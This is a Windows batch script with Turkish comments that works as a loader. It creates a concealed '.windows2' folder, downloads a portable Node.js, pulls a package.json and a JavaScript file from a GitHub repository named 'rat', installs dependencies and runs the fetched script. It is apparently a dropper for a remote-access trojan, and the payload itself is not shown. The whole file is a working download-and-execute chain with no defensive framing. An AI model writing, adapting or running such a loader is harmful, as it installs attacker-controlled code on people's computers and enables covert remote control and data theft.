@echo off
setlocal

:: .windows2 adlı gizli klasörün oluşturulması
set "folderPath=%USERPROFILE%\.windows2"
mkdir "%folderPath%" >nul 2>&1

:: Node.js indirme URL'i
set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"

:: Script dosyasının indirme URL'i
set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/a.js"

:: package.json indirme URL'i
set "packageJsonUrl=https://raw.githubusercontent.com/murmurlab/rat/main/package.json"

:: İndirilecek dosyaların hedef konumu
set "downloadPath=%folderPath%"

:: Node.js indirme
echo Node.js indiriliyor...
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%nodeUrl%', '%downloadPath%\node.zip')"

:: Zip dosyasının çıkarılması
echo Zip dosyası çıkarılıyor...
powershell -command "Expand-Archive -Path '%downloadPath%\node.zip' -DestinationPath '%downloadPath%' -Force"

:: Node.js ve NPM yolu
set "nodePath=%folderPath%\node-v16.3.0-win-x64"

:: Path değişkenini güncelleme
set "PATH=%nodePath%;%PATH%"

:: package.json dosyasının indirilmesi
echo package.json dosyası indiriliyor...
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%packageJsonUrl%', '%folderPath%\package.json')"

:: .windows2 klasöründe npm install
echo .windows2 klasöründe npm install yapılıyor...
cd /d "%folderPath%"
npm install
npm install --global --production windows-build-tools

:: Script dosyasının indirilmesi
echo Script dosyası indiriliyor...
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%scriptUrl%', '%folderPath%\your-script.js')"

:: Node.js'in çalıştırılması
echo Node.js çalıştırılıyor...
"%nodePath%\node.exe" "%folderPath%\your-script.js"

endlocal
pause
